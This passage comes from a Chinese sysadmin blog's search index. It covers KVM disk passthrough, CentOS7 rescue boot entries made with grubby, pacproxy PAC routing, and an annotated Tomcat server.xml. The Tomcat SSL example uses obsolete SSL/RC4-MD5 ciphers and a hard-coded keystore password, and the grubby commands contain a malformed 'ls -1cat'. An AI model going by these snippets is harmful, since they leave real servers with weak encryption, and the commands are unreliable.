-t xfs /dev/sdb1 /mnt/sdb1 然后到实体机的磁盘目录\n# cd /dev/disk/ # ls by-id by-path by-uuid # cd by-id # ll total 0 lrwxrwxrwx 1 root root 9 3月 26 2018 scsi-36b083fe0e4f71a001c36c36716543d4d -\u0026gt; ../../sda lrwxrwxrwx 1 root root 10 3月 26 2018 scsi-36b083fe0e4f71a001c36c36716543d4d-part1 -\u0026gt; ../../sda1 lrwxrwxrwx 1 root root 10 3月 26 2018 scsi-36b083fe0e4f71a001c36c36716543d4d-part2 -\u0026gt; ../../sda2 lrwxrwxrwx 1 root root 10 3月 26 2018 scsi-36b083fe0e4f71a001c36c36716543d4d-part3 -\u0026gt; ../../sda3 lrwxrwxrwx 1 root root 9 11月 18 16:02 scsi-36b083fe0e4f71a002928bf63ef284827 -\u0026gt; ../../sdb lrwxrwxrwx 1 root root 10 11月 18 16:24 scsi-36b083fe0e4f71a002928bf63ef284827-part1 -\u0026gt; ../../sdb1 lrwxrwxrwx 1 root root 9 3月 26 2018 wwn-0x6b083fe0e4f71a001c36c36716543d4d -\u0026gt; ../../sda lrwxrwxrwx 1 root root 10 3月 26 2018 wwn-0x6b083fe0e4f71a001c36c36716543d4d-part1 -\u0026gt; ../../sda1 lrwxrwxrwx 1 root root 10 3月 26 2018 wwn-0x6b083fe0e4f71a001c36c36716543d4d-part2 -\u0026gt; ../../sda2 lrwxrwxrwx 1 root root 10 3月 26 2018 wwn-0x6b083fe0e4f71a001c36c36716543d4d-part3 -\u0026gt; ../../sda3 lrwxrwxrwx 1 root root 9 11月 18 16:02 wwn-0x6b083fe0e4f71a002928bf63ef284827 -\u0026gt; ../../sdb lrwxrwxrwx 1 root root 10 11月 18 16:24 wwn-0x6b083fe0e4f71a002928bf63ef284827-part1 -\u0026gt; ../../sdb1 看中间一行，scsi-36b083fe0e4f71a002928bf63ef284827-part1 指向 /dev/sdb1，记录下来\n然后 virsh-edit 编辑 KVM 虚机文件，增加硬盘部分：\n\u0026lt;disk type=\u0026#39;block\u0026#39; device=\u0026#39;disk\u0026#39;\u0026gt; \u0026lt;driver name=\u0026#39;qemu\u0026#39; type=\u0026#39;raw\u0026#39;/\u0026gt; \u0026lt;source dev=\u0026#39;/dev/disk/by-id/scsi-36b083fe0e4f71a002928bf63ef284827-part1\u0026#39;/\u0026gt; \u0026lt;target dev=\u0026#39;vda\u0026#39; bus=\u0026#39;virtio\u0026#39;/\u0026gt; \u0026lt;/disk\u0026gt; 注：上面我们是使用了 by-id，当然也可以使用 by-path 和 by-uuid 来指定源盘\n重启虚机并进入查看，我们能看到这块盘盘符是 /dev/vda\nfdisk -l Disk /dev/vda: 11755.9 GB, 11755860262912 bytes, 22960664576 sectors Units = sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes 接下来就比较怪异了，这个盘分明没有分区，我们却可以直接 mount\nmount -t xfs /dev/vda /material 然后 df -h 再看\n能认出来，正常使用就行了。\n非常古怪是吧。\n大家还要注意实体机的挂载路径是 /mnt/sdb1，虚机内的挂载路径是 /material，这两个路径都是指向同一块盘，可以共通。\n","permalink":"https://rendoumi.com/posts/20211119-kvm_disk_passthrough/","summary":"\u003cp\u003e这个比较有意思，同事要存放 2TB 的数据，但是系统是 1.7TB 的 4 块 600G 盘组成的 Raid10。\u003c/p\u003e\n\u003cp\u003e很明显盘空间不够了，去库房找两块 10TB 的大盘组成 Raid1 给他用好了。\u003c/p\u003e\n\u003cp\u003e问题来了，系统是 KVM 虚机，怎样把这个 10TB 的大盘给送进虚机呢？\u003c/p\u003e\n\u003cp\u003e这里面还真有要注意的问题：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eImportant\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eGuest virtual machines should not be given write access to whole disks or block devices (for example, /dev/sdb).\u003c/strong\u003e Guest virtual  machines with access to whole block devices may be able to modify  volume labels, which can be used to compromise the host physical  machine system. \u003cstrong\u003eUse partitions (for example, /dev/sdb1) or LVM  volumes to prevent this issue.\u003c/strong\u003e\u003c/p\u003e","title":"KVM下附加硬盘的passthrough直通"},{"content":"说到 CentOS7 的紧急模式与救援模式，网上可以搜到漫天飞的帖子，说一下区别\nRESCUE 救援模式： 救援模式启动的系统没有挂载硬盘，可以将硬盘 mount 出然后拷出数据。\nEMERGENCY 紧急模式： 紧急模式启动的系统是一个最小的环境。根目录档案系统将会被挂载为仅能读取，而且将不会做任何的设定。\n当然进入的方法也很简单，进入系统的时候按 e 修改 grub 菜单参数，就可以进入不同的模式\n本文讨论的重点不是怎么进去，而是那两句命令，在紧急状态下反正我是记不住的\nsystemd.unit=rescue.target systemd.unit=emergency.target 都没有之前的 single 简单，也完全记不住，既然记不住，那就干脆做到菜单里好了，这才是本文的重点。\n现在都是使用 grub2 了，而不是 grub，这很重要。grub2的配置文件是 /boot/grub2/grub.cfg。\n修改 grub2 有两个工具，grub2-mkconfig 和 grubby，不要同时使用这两个工具修改，会覆盖的\ngrub2-mkconfig 会去搜索 /boot 目录下的内核文件，有多少个内核就会生成多少个启动项。那么如果是同一个内核，想修改不同的启动参数，做多个启动项就完蛋，他不能自动生成单内核的多个启动项 grubby 很灵活，可以根据当前 grub2 的配置，生成一个内核，多个不同启动参数的多个启动项。 那么我们要加进去两个只是启动参数不同，内核其实一样的启动项，用 grubby 就好了\ngrubby --add-kernel=\\$(ls -1cat /boot/vmlinuz*|grep rescue) --title=\u0026#34;RESCUE BOOT\u0026#34; --initrd=\\$(ls -1cat /boot/initramfs*|grep rescue) --args=\u0026#34;systemd.unit=rescue.target\u0026#34; --copy-default grubby --add-kernel=\\$(ls -1cat /boot/vmlinuz*|grep rescue) --title=\u0026#34;EMERGENCY BOOT\u0026#34; --initrd=\\$(ls -1cat /boot/initramfs*|grep rescue) --args=\u0026#34;systemd.unit=emergency.target\u0026#34; --copy-default 切忌我们之后不能运行\ngrub2-mkconfig -o /boot/grub2/grub.cfg 否则上面的两个启动项菜单会消失，因为 grub2-mkconfig 配置的话一个内核只能有一个启动项\ngrub2-mkconfig 也有自己的强项，如果要修改缺省的菜单超时时间，grubby 就做不到了\nsed -i \u0026#39;/^GRUB_TIMEOUT=/s/^.*$/GRUB_TIMEOUT=10/\u0026#39; /etc/default/grub grub2-mkconfig -o /boot/grub2/grub.cfg ","permalink":"https://rendoumi.com/posts/20211119-linux_rescue/","summary":"\u003cp\u003e说到 CentOS7 的紧急模式与救援模式，网上可以搜到漫天飞的帖子，说一下区别\u003c/p\u003e\n\u003cp\u003eRESCUE 救援模式：\n救援模式启动的系统没有挂载硬盘，可以将硬盘 mount 出然后拷出数据。\u003c/p\u003e\n\u003cp\u003eEMERGENCY 紧急模式：\n紧急模式启动的系统是一个最小的环境。根目录档案系统将会被挂载为仅能读取，而且将不会做任何的设定。\u003c/p\u003e\n\u003cp\u003e当然进入的方法也很简单，进入系统的时候按 e 修改 grub 菜单参数，就可以进入不同的模式\u003c/p\u003e\n\u003cp\u003e本文讨论的重点不是怎么进去，而是那两句命令，在紧急状态下反正我是记不住的\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemd.unit\u003cspan class=\"o\"\u003e=\u003c/span\u003erescue.target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemd.unit\u003cspan class=\"o\"\u003e=\u003c/span\u003eemergency.target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e都没有之前的 single 简单，也完全记不住，既然记不住，那就干脆做到菜单里好了，这才是本文的重点。\u003c/p\u003e\n\u003cp\u003e现在都是使用 grub2 了，而不是 grub，这很重要。grub2的配置文件是 /boot/grub2/grub.cfg。\u003c/p\u003e\n\u003cp\u003e修改 grub2 有两个工具，grub2-mkconfig 和 grubby，不要同时使用这两个工具修改，会覆盖的\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003egrub2-mkconfig 会去搜索 /boot 目录下的内核文件，有多少个内核就会生成多少个启动项。那么如果是同一个内核，想修改不同的启动参数，做多个启动项就完蛋，他不能自动生成单内核的多个启动项\u003c/li\u003e\n\u003cli\u003egrubby 很灵活，可以根据当前 grub2 的配置，生成一个内核，多个不同启动参数的多个启动项。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e那么我们要加进去两个只是启动参数不同，内核其实一样的启动项，用 grubby 就好了\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrubby --add-kernel\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\$\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003els -1cat /boot/vmlinuz*\u003cspan class=\"p\"\u003e|\u003c/span\u003egrep rescue\u003cspan class=\"o\"\u003e)\u003c/span\u003e --title\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;RESCUE BOOT\u0026#34;\u003c/span\u003e --initrd\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\$\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003els -1cat /boot/initramfs*\u003cspan class=\"p\"\u003e|\u003c/span\u003egrep rescue\u003cspan class=\"o\"\u003e)\u003c/span\u003e --args\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;systemd.unit=rescue.target\u0026#34;\u003c/span\u003e --copy-default\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrubby --add-kernel\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\$\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003els -1cat /boot/vmlinuz*\u003cspan class=\"p\"\u003e|\u003c/span\u003egrep rescue\u003cspan class=\"o\"\u003e)\u003c/span\u003e --title\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;EMERGENCY BOOT\u0026#34;\u003c/span\u003e --initrd\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\$\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003els -1cat /boot/initramfs*\u003cspan class=\"p\"\u003e|\u003c/span\u003egrep rescue\u003cspan class=\"o\"\u003e)\u003c/span\u003e --args\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;systemd.unit=emergency.target\u0026#34;\u003c/span\u003e --copy-default\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e切忌我们之后不能运行\u003c/p\u003e","title":"CentOS7的救援模式和紧急模式"},{"content":"说实在话，这个场景非常怪异，客户在 linux 下要动态根据 url 选择代理：\n看图，中间的是前端代理，地址是 192.168.1.1:8080，然后客户设置使用这个代理\nexport http_proxy=http://192.168.1.1:8080 export https_proxy=http://192.168.1.1:8080 然后对应后端有三个代理，两个 http 代理，一个 socks 代理\nhttp 192.168.2.1:3128 socks 192.168.2.2:1080 http 192.168.2.3:3128 我们要根据客户的请求 URL 来决定具体要使用后端的哪个代理\n这个如果在浏览器上设置非常容易，设置 PAC 即可。但是偏偏客户端不是浏览器，而是一个程序，那么麻烦就来了。怎么设置呢？\n步骤很简单：\n一、安装 pacproxy 网址：https://github.com/williambailey/pacproxy\nwget https://github.com/williambailey/pacproxy/releases/download/v.2.0.4/pacproxy_2.0.4_linux_amd64.tar.gz tar zxvf pacproxy_2.0.4_linux_amd64.tar.gz 拷出来 pacproxy 备用\n二、生成配置文件 最主要的就是 PAC 文件的生成\n我们给个例子：\ncat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; pac function FindProxyForURL(url, host) { if (host == \u0026#34;www.baidu.com\u0026#34;) { return \u0026#34;PROXY 192.168.2.1:3128\u0026#34;; } else if (host == \u0026#34;www.sina.com.cn\u0026#34;) { return \u0026#34;SOCKS 192.168.2.2:1080\u0026#34;; } else if (host == \u0026#34;www.sohu.com\u0026#34;) { return \u0026#34;SOCKS 192.168.2.3:1080\u0026#34;; } else { return \u0026#34;DIRECT\u0026#34;; } } EOF 其实 PAC 文件的内容就是一段 javascript，用来返回代理的地址\n运行并测试：\npacproxy -c pac -l 0.0.0.0:8080 -v export http_proxy=http://192.168.1.1:8080 export https_proxy=http://192.168.1.1:8080 curl -I www.baidu.com 这样就在 Linux 搭建了一个动态的 PAC 代理\nPAC文件的参考资料：\nhttps://web.archive.org/web/20070602031929/http://wp.netscape.com/eng/mozilla/2.0/relnotes/demo/proxy-live.html\nhttps://developer.mozilla.org/zh-CN/docs/Web/HTTP/Proxy_servers_and_tunneling/Proxy_Auto-Configuration_PAC_file\nhttps://www.websense.com/content/support/library/web/v76/pac_file_best_practices/PAC_file_sample.aspx\n","permalink":"https://rendoumi.com/posts/20211116-pacproxy/","summary":"\u003cp\u003e说实在话，这个场景非常怪异，客户在 linux 下要动态根据 url 选择代理：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211116132624536\" loading=\"lazy\" src=\"/posts/20211116-pacproxy/image-20211116132624536.png\"\u003e\u003c/p\u003e\n\u003cp\u003e看图，中间的是前端代理，地址是 192.168.1.1:8080，然后客户设置使用这个代理\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003ehttp_proxy\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ehttp://192.168.1.1:8080\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003ehttps_proxy\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ehttp://192.168.1.1:8080\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后对应后端有三个代理，两个 http 代理，一个 socks 代理\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttp  192.168.2.1:3128\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esocks 192.168.2.2:1080\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttp  192.168.2.3:3128\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e我们要根据客户的请求 URL 来决定具体要使用后端的哪个代理\u003c/p\u003e\n\u003cp\u003e这个如果在浏览器上设置非常容易，设置 PAC 即可。但是偏偏客户端不是浏览器，而是一个程序，那么麻烦就来了。怎么设置呢？\u003c/p\u003e\n\u003cp\u003e步骤很简单：\u003c/p\u003e\n\u003ch2 id=\"一安装-pacproxy\"\u003e一、安装 pacproxy\u003c/h2\u003e\n\u003cp\u003e网址：https://github.com/williambailey/pacproxy\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://github.com/williambailey/pacproxy/releases/download/v.2.0.4/pacproxy_2.0.4_linux_amd64.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf pacproxy_2.0.4_linux_amd64.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e拷出来 pacproxy 备用\u003c/p\u003e\n\u003ch2 id=\"二生成配置文件\"\u003e二、生成配置文件\u003c/h2\u003e\n\u003cp\u003e最主要的就是 PAC 文件的生成\u003c/p\u003e\n\u003cp\u003e我们给个例子：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; pac\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003efunction FindProxyForURL(url, host)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    if (host == \u0026#34;www.baidu.com\u0026#34;) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e        return \u0026#34;PROXY 192.168.2.1:3128\u0026#34;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    else if (host == \u0026#34;www.sina.com.cn\u0026#34;) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e        return \u0026#34;SOCKS 192.168.2.2:1080\u0026#34;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    else if (host == \u0026#34;www.sohu.com\u0026#34;) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e        return \u0026#34;SOCKS 192.168.2.3:1080\u0026#34;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    }    \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    else {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e        return \u0026#34;DIRECT\u0026#34;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e其实 PAC 文件的内容就是一段 javascript，用来返回代理的地址\u003c/p\u003e","title":"linux下web pacproxy的用法"},{"content":"Tomcat 是一个 HTTP server。同时，它也是一个 serverlet 容器，可以执行 java 的 Servlet，也可以把 JavaServer Pages（JSP）和 JavaServerFaces（JSF）编译成 Java Servlet。它的模型图如下：\n给个生产环境 server.xml 的例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 \u0026lt;?xml version=\u0026#39;1.0\u0026#39; encoding=\u0026#39;utf-8\u0026#39;?\u0026gt; \u0026lt;Server port=\u0026#34;-1\u0026#34; shutdown=\u0026#34;SHUTDOWN\u0026#34;\u0026gt; \u0026lt;Listener className=\u0026#34;org.apache.catalina.startup.VersionLoggerListener\u0026#34; /\u0026gt; \u0026lt;Listener className=\u0026#34;org.apache.catalina.core.AprLifecycleListener\u0026#34; SSLEngine=\u0026#34;on\u0026#34; /\u0026gt; \u0026lt;Listener className=\u0026#34;org.apache.catalina.core.JreMemoryLeakPreventionListener\u0026#34; /\u0026gt; \u0026lt;Listener className=\u0026#34;org.apache.catalina.mbeans.GlobalResourcesLifecycleListener\u0026#34; /\u0026gt; \u0026lt;Listener className=\u0026#34;org.apache.catalina.core.ThreadLocalLeakPreventionListener\u0026#34; /\u0026gt; \u0026lt;GlobalNamingResources\u0026gt; \u0026lt;Resource name=\u0026#34;UserDatabase\u0026#34; auth=\u0026#34;Container\u0026#34; type=\u0026#34;org.apache.catalina.UserDatabase\u0026#34; description=\u0026#34;User database that can be updated and saved\u0026#34; factory=\u0026#34;org.apache.catalina.users.MemoryUserDatabaseFactory\u0026#34; pathname=\u0026#34;conf/tomcat-users.xml\u0026#34; /\u0026gt; \u0026lt;/GlobalNamingResources\u0026gt; \u0026lt;Service name=\u0026#34;Catalina\u0026#34;\u0026gt; \u0026lt;Connector port=\u0026#34;8080\u0026#34; server=\u0026#34;www.rendoumi.com\u0026#34; protocol=\u0026#34;org.apache.coyote.http11.Http11NioProtocol\u0026#34; maxHttpHeaderSize=\u0026#34;8192\u0026#34; acceptCount=\u0026#34;500\u0026#34; maxThreads=\u0026#34;1000\u0026#34; minSpareThreads=\u0026#34;200\u0026#34; enableLookups=\u0026#34;false\u0026#34; redirectPort=\u0026#34;8443\u0026#34; connectionTimeout=\u0026#34;20000\u0026#34; relaxedQueryChars=\u0026#34;[]|{}@!$*()+\u0026#39;.,;^\\`\u0026amp;quot;\u0026amp;lt;\u0026amp;gt;\u0026#34; disableUploadTimeout=\u0026#34;true\u0026#34; allowTrace=\u0026#34;false\u0026#34; URIEncoding=\u0026#34;UTF-8\u0026#34; useBodyEncodingForURI=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;Engine name=\u0026#34;Catalina\u0026#34; defaultHost=\u0026#34;localhost\u0026#34;\u0026gt; \u0026lt;Realm className=\u0026#34;org.apache.catalina.realm.LockOutRealm\u0026#34;\u0026gt; \u0026lt;Realm className=\u0026#34;org.apache.catalina.realm.UserDatabaseRealm\u0026#34; resourceName=\u0026#34;UserDatabase\u0026#34;/\u0026gt; \u0026lt;/Realm\u0026gt; \u0026lt;Host name=\u0026#34;localhost\u0026#34; appBase=\u0026#34;webapps\u0026#34; unpackWARs=\u0026#34;false\u0026#34; autoDeploy=\u0026#34;false\u0026#34;\u0026gt; \u0026lt;Valve className=\u0026#34;org.apache.catalina.valves.AccessLogValve\u0026#34; directory=\u0026#34;logs\u0026#34; prefix=\u0026#34;access_log.\u0026#34; suffix=\u0026#34;.txt\u0026#34; fileDateFormat=\u0026#34;yyyy-MM-dd\u0026#34; pattern=\u0026#34;%a|%A|%T|%{X-Forwarded-For}i|%l|%u|%t|%r|%s|%b|%{Referer}i|%{User-Agent}i \u0026#34; resolveHosts=\u0026#34;false\u0026#34;/\u0026gt; \u0026lt;Context path=\u0026#34;\u0026#34; docBase=\u0026#34;/export/servers/tomcat/webapps/web\u0026#34; /\u0026gt; \u0026lt;/Host\u0026gt; \u0026lt;/Engine\u0026gt; \u0026lt;/Service\u0026gt; \u0026lt;/Server\u0026gt; 分解开来一部分一部分的看：\nServer Server 第2行，是最大且必须唯一的组件。表示一个 Tomcat 的实例，它可以包含多个 Services，而每个 Service 都可以有自己的 Engine 和 connectors。\n\u0026lt;Server port=\u0026#34;8005\u0026#34; shutdown=\u0026#34;SHUTDOWN\u0026#34;\u0026gt; ...... \u0026lt;/Server\u0026gt; 注意上面，我们把缺省的 port=\u0026ldquo;8005\u0026rdquo; 改成了 “-1”，这样防止从8005重启，避免安全问题。\nListeners 一个 Server 容器拥有若干 Listeners (行 3-7)。一个 Listener 监听并回应特定的事件.\n例如 GlobalResourcesLifecycleListener 就设置了 global resources，这样就可以使用 JNDI 来存取像数据库这种资源。\n\u0026lt;Listener className=\u0026#34;org.apache.catalina.mbeans.GlobalResourcesLifecycleListener\u0026#34; /\u0026gt; Global Naming Resources \u0026lt;GlobalNamingResources\u0026gt; (行 9-15) 定义了 JNDI (Java Naming and Directory Interface) 资源，这个是 LDAP 的东西，允许 java 软件通过目录发现对象和属性值。\n缺省定义了一个 UserDatabase 的 JNDI 资源（行 10-14），这个对象其实是一个内存数据库，保存着从 conf/tomcat-users.xml 中加载上来的用户认证数据。\n\u0026lt;GlobalNamingResources\u0026gt; \u0026lt;Resource name=\u0026#34;UserDatabase\u0026#34; auth=\u0026#34;Container\u0026#34; type=\u0026#34;org.apache.catalina.UserDatabase\u0026#34; description=\u0026#34;User database that can be updated and saved\u0026#34; factory=\u0026#34;org.apache.catalina.users.MemoryUserDatabaseFactory\u0026#34; pathname=\u0026#34;conf/tomcat-users.xml\u0026#34; /\u0026gt; \u0026lt;/GlobalNamingResources\u0026gt; 我们可以再定义一个 Mysql 之类的 JNDI 来保存 mysql 数据库连接信息，用来实现连接池\nServices Service 用来关联多个 Connectors 到 Engine。缺省的配置是配了一个 叫做 Catalina 的 Service ，Catalinna 缺省配了两个 Connectors，一个是8080的HTTP，一个是8009的AJP。\n\u0026lt;Service name=\u0026#34;Catalina\u0026#34;\u0026gt; \u0026lt;Connector port=\u0026#34;8080\u0026#34; protocol=\u0026#34;HTTP/1.1\u0026#34; connectionTimeout=\u0026#34;20000\u0026#34; redirectPort=\u0026#34;8443\u0026#34; /\u0026gt; \u0026lt;Connector port=\u0026#34;8009\u0026#34; protocol=\u0026#34;AJP/1.3\u0026#34; redirectPort=\u0026#34;8443\u0026#34; /\u0026gt; \u0026lt;/Service\u0026gt; 注意最上面的配置，我们取消了8009的AJP，这个协议现在基本没人用，取消掉也避免安全问题。\n下面给出一个 SSL 8443 的 connectors 的例子\n\u0026lt;Connector port=\u0026#34;8443\u0026#34; maxHttpHeaderSize=\u0026#34;8192\u0026#34; SSLEnabled=\u0026#34;true\u0026#34; server=\u0026#34;Rendoumi\u0026#34; maxThreads=\u0026#34;150\u0026#34; minSpareThreads=\u0026#34;25\u0026#34; maxSpareThreads=\u0026#34;75\u0026#34; enableLookups=\u0026#34;false\u0026#34; disableUploadTimeout=\u0026#34;true\u0026#34; acceptCount=\u0026#34;100\u0026#34; scheme=\u0026#34;https\u0026#34; secure=\u0026#34;true\u0026#34; clientAuth=\u0026#34;false\u0026#34; URIEncoding=\u0026#34;UTF-8\u0026#34; sslProtocol=\u0026#34;SSL\u0026#34; ciphers=\u0026#34;SSL_RSA_WITH_RC4_128_MD5, SSL_RSA_WITH_RC4_128_SHA\u0026#34; keystoreFile=\u0026#34;/export/servers/tomcat/rendoumi.keystore\u0026#34; keystorePass=\u0026#34;Fuck2020\u0026#34; /\u0026gt; Containers 概念 Tomcat 的容器概念，Tomcat认为 Engine, Host, Context 和 Cluster处在同一个容器中. 最顶层的是 Engine; 最底层是Context。\n另外像 Realm 和 Valve，也可以放在容器中\nEngine Engine 是容器的顶端，可以包含有若干 Hosts。我们可以配置 tomcat 服务多个虚拟主机。下面配置就是服务本机的一个服务。\n\u0026lt;Engine name=\u0026#34;Catalina\u0026#34; defaultHost=\u0026#34;localhost\u0026#34;\u0026gt; Catalina Engine 从 HTTP connector 处接收到客户端的 HTTP 请求，根据请求头中 Host: xxx 的内容，把请求路由到某个具体的 Host上。\nRealm Realm 本质是一个数据库，是用来保存用户名、密码、认证角色的东西。\n\u0026lt;Realm className=\u0026#34;org.apache.catalina.realm.LockOutRealm\u0026#34;\u0026gt; \u0026lt;Realm className=\u0026#34;org.apache.catalina.realm.UserDatabaseRealm\u0026#34; resourceName=\u0026#34;UserDatabase\u0026#34;/\u0026gt; \u0026lt;/Realm\u0026gt; Hosts Host 定义了虚拟主机，可以定义多个虚拟主机。其中 appBase 千万不能为空，否则就可以读到 tomcat 的所有文件，就出线上事故大 Bug 了！！！\n\u0026lt;Host name=\u0026#34;localhost\u0026#34; appBase=\u0026#34;webapps\u0026#34; unpackWARs=\u0026#34;true\u0026#34; autoDeploy=\u0026#34;true\u0026#34;\u0026gt; 我们最上面的生产配置，不自解压，也不自动部署。\nValve Valve 是用来拦截 HTTP requests的，做预处理后再交给下一个组件，它能在 Engine, Host, Context 